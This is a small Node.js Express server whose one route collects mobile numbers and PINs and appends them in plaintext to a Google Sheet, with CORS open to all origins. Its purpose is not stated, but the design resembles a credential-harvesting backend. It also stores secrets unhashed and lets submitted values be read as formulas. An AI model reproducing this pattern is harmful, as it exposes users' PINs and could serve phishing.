const express = require("express");
const cors = require("cors");
const { google } = require("googleapis");
require("dotenv").config();

const app = express();

const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());

// Google authentication
const auth = new google.auth.GoogleAuth({
  credentials: {
    client_email: process.env.GOOGLE_CLIENT_EMAIL,
    private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, "\n"),
  },

  scopes: [
    "https://www.googleapis.com/auth/spreadsheets",
  ],
});

// Google Sheets client
const sheets = google.sheets({
  version: "v4",
  auth,
});

// Test route
app.get("/", (req, res) => {
  res.send("Server is running!");
});

// Save mobile number and PIN
app.post("/api/users", async (req, res) => {
  try {
    const { mobile, pin } = req.body;

    // Validation
    if (!mobile || !pin) {
      return res.status(400).json({
        success: false,
        message: "Mobile number and PIN are required",
      });
    }

    // Add data to Google Sheet
    await sheets.spreadsheets.values.append({
      spreadsheetId: process.env.GOOGLE_SHEET_ID,

      range: "Sheet1!A:C",

      valueInputOption: "USER_ENTERED",

      requestBody: {
        values: [
          [
            new Date().toLocaleString(),
            mobile,
            pin,
          ],
        ],
      },
    });

    res.status(200).json({
      success: true,
      message: "Data saved successfully",
    });

  } catch (error) {
    console.error("Google Sheets Error:", error);

    res.status(500).json({
      success: false,
      message: "Failed to save data",
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});